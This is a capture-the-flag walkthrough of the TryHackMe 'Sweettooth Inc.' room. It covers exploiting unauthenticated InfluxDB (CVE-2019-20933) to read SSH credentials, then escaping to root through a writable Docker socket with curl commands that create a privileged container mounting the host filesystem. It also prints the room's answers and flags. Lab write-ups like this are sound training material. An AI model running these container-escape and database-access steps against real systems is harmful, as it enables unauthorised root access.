---
title: Sweettooth Inc.
layout: post
author: Bit Criminals Team
date: 2021-07-25 20:00:00 +0530
type: Pentesting
difficulty: Medium
prompt: https://tryhackme.com/room/sweettoothinc
---


On enumerating we get the following three open ports.

![](/images/leo/nmap.png)  
 
```
Do a TCP portscan. What is the name of the database software running on one of these ports?
influxdb
```

On looking for influxdb vulnerbilities I found this resource <https://github.com/c-sh0/security/blob/master/influxdb.txt>

Using the url <10.10.127.163:8086/debug/requests>

![](/images/leo/user1.png)

```
What is the database user you find?
o5yY6yya
```

We can get access to the database following the above resource but I found this script 
<https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933>

Running the script 

![](/images/leo/script.png)

Also found this very helpful cheatsheet for influxdb <https://gist.github.com/tomazursic/6cc217e2644c619ceceefb8ce824925b>

Filling in the database as ``` tanks ```

Using the query as ``` SHOW MEASUREMENTS ```

![](/images/leo/tanks.png)

Then using the query ``` SELECT * FROM water_tank ```
Gives us the temperatures of water tank at diffrent time

Using <https://www.epochconverter.com/> to convert the timestamp to human readable date time format 

![](/images/leo/epoch.png)

```
What was the temperature of the water tank at 1621346400 (UTC Unix Timestamp)?
22.5
```
Now we use exit to change our database and fill in ``` mixer ```

Using the query ``` SHOW MEASUREMENTS ```

![](/images/leo/mixer.png)

Then using the query as ``` SELECT * FROM mixer_stats ```
Gives us the motor rpm at different time 
Looking through them we find the highest rpm 

```
What is the highest rpm the motor of the mixer reached?
4875
```

Again we change the database to ``` creds ```
Using the query ``` SHOW MEASUREMENTS ``` 

![](/images/leo/creds.png)

Then using the query as ``` SELECT * FROM ssh ```

![](/images/leo/ssh.png)

```
What username do you find in one of the databases?
uzJk6Ry98d8C
```

Now that we have the username and password we can ssh into the machine

```
ssh uzJk6Ry98d8C@10.10.127.163 -p 8086
```

Now we can read the user.txt

```
user.txt
THM{V4w4FhBmtp4RFDti}
```

Running linpeas tells us that we ```write permission over docker socket /run/docker.sock```
But we cannot use the docker command 

We find this resource <https://securityboulevard.com/2019/02/abusing-docker-api-socket/>

Basically we are going to create a container on the Nginx and then gain root access through it.

Using the command 
``` 
curl –insecure -X POST -H "Content-Type: application/json" http://127.0.0.1:2376/containers/create?name=test -d '{"Image":"sweettoothinc", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

Returns the id of our container
```
"Id":"39d4cf768ec3fae31a9af685cefcba1244a351acb88841a5c822e7bceb4009d3","Warnings":null
```

Now we start the container using the command
```
curl –insecure -X POST -H "Content-Type: application/json" http://127.0.0.1:2376/containers/39d4cf768ec3fae31a9af685cefcba1244a351acb88841a5c822e7bceb4009d3/start?name=test
```

We gain root shell using the command
```
docker -H 127.0.0.1:2376 exec -it 39d4cf768ec3 /bin/bash
```

And voila we are root now

```
root@39d4cf768ec3:/# whoami
root
root@39d4cf768ec3:/# cd /root
root@39d4cf768ec3:/root# ls
root.txt
root@39d4cf768ec3:/root# cat root.txt
```
```
/root/root.txt
THM{5qsDivHdCi2oabwp}
```

Looking into the /mnt directory we find another root directory

```
root@39d4cf768ec3:/mnt/var/lib/docker# cd /mnt
root@39d4cf768ec3:/mnt# ls
bin   etc         initrd.img.old  lost+found  opt   run   sys  var
boot  home        lib             media       proc  sbin  tmp  vmlinuz
dev   initrd.img  lib64           mnt         root  srv   usr  vmlinuz.old
root@39d4cf768ec3:/mnt# cd root
root@39d4cf768ec3:/mnt/root# ls
root.txt
root@39d4cf768ec3:/mnt/root# cat root.txt
```

```
The second /root/root.txt
THM{nY2ZahyFABAmjrnx}
```



